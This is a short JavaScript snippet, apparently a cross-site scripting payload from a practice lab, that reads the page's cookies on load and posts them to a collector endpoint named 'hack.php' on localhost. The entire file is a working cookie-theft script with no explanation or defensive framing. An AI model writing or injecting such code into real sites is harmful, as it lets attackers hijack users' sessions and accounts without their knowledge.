window.addEventListener('load', (event) => {
	let x = document.cookie;
	let formData = new FormData()
	formData.append("cookie", x)

	fetch("http://localhost:4002/hack.php", {
		method: "POST",
		body: formData
	})
});
